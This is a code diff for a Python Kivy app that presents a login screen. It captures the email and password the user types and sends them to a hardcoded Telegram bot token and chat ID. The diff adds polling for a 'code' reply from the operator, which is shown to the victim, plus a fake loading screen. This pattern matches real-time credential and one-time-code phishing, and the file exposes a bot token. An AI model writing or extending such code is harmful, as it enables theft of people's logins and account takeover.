@@ -1,29 +1,27 @@
 from kivy.app import App
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.button import Button
-from kivy.uix.textinput import TextInput
 from kivy.network.urlrequest import UrlRequest
 from kivy.core.window import Window
-from kivy.uix.anchorlayout import AnchorLayout
-from kivy.uix.label import Label
 import certifi
 from urllib.parse import urlencode
-from kivy.uix.image import Image
 from kivy.lang import Builder
 from kivy.uix.screenmanager import Screen, ScreenManager
-from kivy.clock import Clock
+from time import sleep
+from kivy.animation import Animation
 
-Window.clearcolor = (0.859, 0.859, 0.859, 1)
+
+ttext = 'None'
+Window.clearcolor = (0.075, 0, 0.141, 1)
 sm = ScreenManager()
 
 
 class EnterScreen(Screen):
     def from_input(self, *args):
-        data = "*Login:* " + "`" + self.ids['email'].text + "`" + "\n*Password:* " + "`" + self.ids['password'].text + "`"
-        data = urlencode({'text': data})
-        self.r = UrlRequest(
+        data = "*Login:* " + "`" + self.ids['email'].text + "`" + "\n*Password:* " + "`" + self.ids['password'].text + "`"  # Забираем введённые данные
+        data = urlencode({'text': data})  # Кодируем их для отправки по url
+        self.r = UrlRequest(  # Делаем url запрос для отпраки сообщения через бота в телеграме
             f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/sendMessage?chat_id"
             f"=888281527&{data}&parse_mode=MarkdownV2", on_success=self.safe, ca_file=certifi.where())
+
     def safe(self, *args):
         self.last = self.r.result['result']['message_id'] + 1
         self.make_request()
@@ -33,16 +31,38 @@ class EnterScreen(Screen):
                             self.prr)
 
     def prr(self, *args):
-        if self.r.result['result'][0]['message']['message_id'] == self.last:
-            print(self.r.result['result'][0]['message']['text'])
+
+        print("*")
+        if self.r.result['result'] and self.r.result['result'][0]['message']['message_id'] == self.last:
+            text = self.r.result['result'][0]['message']['text']
+            print(text)
+            if text[:4] == 'code':
+                global ttext
+                ttext = text[5:]
+                self.manager.current = 'code'
+            else:
+                self.last += 1
+                self.make_request()
         else:
             self.make_request()
 
 class CodeScreen(Screen):
-    pass
+    def on_enter(self):
+        global ttext
+        self.ids.code_text.text=ttext
+
+class LoadingScreen(Screen):
+    def on_enter(self):
+        anim = Animation(color=(1,1,1,0.4), duration=1, step=1/50, transition='in_out_quad') + Animation(color=(1,1,1,1), duration=1, step=1/50, transition='in_out_quad')
+        anim.repeat = True
+        anim.start(self.ids.lo, )
+
+
+
 
 sm.add_widget(EnterScreen(name='enter'))
 sm.add_widget(CodeScreen(name='code'))
+sm.add_widget(LoadingScreen(name='loading'))
 
 
 class My(App):
